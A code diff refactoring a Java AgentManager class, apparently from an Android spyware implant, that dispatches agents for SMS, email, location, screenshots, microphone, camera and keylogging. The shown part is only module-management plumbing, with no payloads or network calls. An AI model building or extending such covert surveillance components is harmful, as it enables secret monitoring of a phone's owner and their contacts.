@@ -21,7 +21,7 @@ import com.ht.RCSAndroidGUI.util.Check;
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager<AgentBase> {
+public class AgentManager extends Manager<AgentBase, AgentType> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager";
@@ -54,71 +54,71 @@ public class AgentManager extends Manager<AgentBase> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private AgentBase factory(final int key) {
+	private AgentBase factory(AgentType type) {
 		AgentBase a = null;
 
-		if (running.containsKey(key) == true) {
-			return running.get(key);
+		if (running.containsKey(type) == true) {
+			return running.get(type);
 		}
 
-		switch (key) {
-		case AgentConf.AGENT_SMS:
+		switch (type) {
+		case AGENT_SMS:
 			a = new MessageAgent();
 			break;
 
-		case AgentConf.AGENT_TASK:
+		case AGENT_TASK:
 			break;
 
-		case AgentConf.AGENT_CALLLIST:
+		case AGENT_CALLLIST:
 			break;
 
-		case AgentConf.AGENT_DEVICE:
+		case AGENT_DEVICE:
 			a = new DeviceAgent();
 			break;
 
-		case AgentConf.AGENT_POSITION:
+		case AGENT_POSITION:
 			a = new PositionAgent();
 			break;
 
-		case AgentConf.AGENT_CALL:
+		case AGENT_CALL:
 			break;
 
-		case AgentConf.AGENT_CALL_LOCAL:
+		case AGENT_CALL_LOCAL:
 			break;
 
-		case AgentConf.AGENT_KEYLOG:
+		case AGENT_KEYLOG:
 			break;
 
-		case AgentConf.AGENT_SNAPSHOT:
+		case AGENT_SNAPSHOT:
 			a = new SnapshotAgent();
 			break;
 
-		case AgentConf.AGENT_URL:
+		case AGENT_URL:
 			break;
 
-		case AgentConf.AGENT_IM:
+		case AGENT_IM:
 			break;
 
-		case AgentConf.AGENT_EMAIL:
+		case AGENT_EMAIL:
 			a = new MessageAgent();
 			break;
 
-		case AgentConf.AGENT_MIC:
+		case AGENT_MIC:
 			a = new MicAgent();
 			break;
 
-		case AgentConf.AGENT_CAM:
+		case AGENT_CAM:
 			a = new CameraAgent();
 			break;
 
-		case AgentConf.AGENT_CLIPBOARD:
+		case AGENT_CLIPBOARD:
 			break;
 
-		case AgentConf.AGENT_CRISIS:
+		case AGENT_CRISIS:
 			a = new CrisisAgent();
 			break;
 
-		case AgentConf.AGENT_APPLICATION:
+		case AGENT_APPLICATION:
 			break;
 
 		default:
@@ -126,7 +126,7 @@ public class AgentManager extends Manager<AgentBase> {
 		}
 
 		if (a != null) {
-			running.put(key, a);
+			running.put(type, a);
 		}
 
 		return a;
@@ -138,7 +138,7 @@ public class AgentManager extends Manager<AgentBase> {
 	 * @return true, if successful
 	 */
 	public boolean startAll() {
-		HashMap<Integer, AgentConf> agents;
+		HashMap<AgentType, AgentConf> agents;
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
@@ -151,10 +151,10 @@ public class AgentManager extends Manager<AgentBase> {
 			return false;
 		}
 
-		final Iterator<Integer> it = agents.keySet().iterator();
+		final Iterator<AgentType> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
-			final Integer key = it.next();
+			final AgentType key = it.next();
 			AgentConf conf = agents.get(key);
 			if(conf.isEnabled()){
 				start(key);
@@ -169,12 +169,12 @@ public class AgentManager extends Manager<AgentBase> {
 	 * Stop agents.
 	 */
 	public void stopAll() {
-		HashMap<Integer, AgentConf> agents;
+		HashMap<AgentType, AgentConf> agents;
 		agents = status.getAgentsMap();
-		final Iterator<Integer> it = agents.keySet().iterator();
+		final Iterator<AgentType> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
-			final Integer key = it.next();
+			final AgentType key = it.next();
 			stop(key);
 		}
 		
@@ -191,8 +191,8 @@ public class AgentManager extends Manager<AgentBase> {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void start(final int key) {
-		HashMap<Integer, AgentConf> agents;
+	public synchronized void start(final AgentType key) {
+		HashMap<AgentType, AgentConf> agents;
 
 		agents = status.getAgentsMap();
 
@@ -245,7 +245,7 @@ public class AgentManager extends Manager<AgentBase> {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void stop(final int key) {
+	public synchronized void stop(final AgentType key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
 			Log.d("QZ", TAG + " Agent " + key + " not present");
